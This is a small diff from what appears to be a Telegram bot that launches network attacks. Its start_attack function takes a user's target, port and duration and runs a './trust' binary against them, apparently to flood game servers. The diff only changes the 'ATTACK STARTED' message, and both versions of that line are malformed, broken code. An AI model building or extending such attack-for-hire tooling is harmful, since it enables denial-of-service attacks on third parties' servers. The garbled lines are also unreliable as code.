@@ -380,7 +380,7 @@ def start_attack(user_id, target, port, duration):
         attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
 
         # Notify the user and start the attack
-        bot.send_message(user_id, f" response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐢𝐦𝐞: {time} "
+        bot.send_message(user_id, f" response = " 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🔥🔥. "
         
         # Execute the bgmi command on VPS
         attack_command = f"./trust {target} {port} {duration} {9} 900"
